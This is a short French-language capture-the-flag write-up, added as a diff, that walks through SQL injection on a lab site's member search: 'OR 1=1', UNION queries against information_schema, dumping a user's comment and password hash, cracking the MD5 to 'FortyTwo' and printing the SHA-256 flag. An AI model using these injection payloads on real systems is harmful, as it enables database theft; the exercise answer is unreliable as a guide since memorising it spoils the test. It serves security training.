@@ -1,0 +1,52 @@
+Sur la page members, il y a un champ texte qui recherche par id. 
+
+En mettant, par exemple une lettre il renvoie une erreur SQL donc non protege, la requete doit dont ressembler a :
+
+echo query("SELECT firstname, lastname FROM users WHERE user_id = $_GET["id"])
+
+. donc si on met le get id avec 1 OR 1=1, il nous renvoie la liste des members. il y a un utilisateur get the flag. 
+
+avec un union on peut aller recuperer les noms des tables avec la database informations_schema : 
+
+1 OR 1=1 union SELECT table_name, column_name FROM information_schema
+
+On connait donc le schema de la table user :
+
+First name: users
+Surname : user_id
+ID: 1 OR 1=1 union SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : first_name
+ID: 1 OR 1=1 union SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : last_name
+ID: 1 OR 1=1 union SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : town
+ID: 1 OR 1=1 union SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : country
+ID: 1 OR 1=1 union SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : planet
+ID: 1 OR 1=1 union SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : Commentaire
+ID: 1 OR 1=1 union SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : countersign
+
+Ce qui permet de recup ce qu'on veut sur l'utilisateur get the flag. On recup l'id. 
+1 OR 1=1 union SELECT user_id, first_name FROM users 
+
+id 5
+
+1 OR 1=1 union SELECT Commentaire, countersign FROM users WHERE user_id = 5
+
+Flag get 
+Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+5ff9d0165b4f92b14994e5c685cdce28 (md5) => FortyTwo
+
+fortytwo sha256 => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+
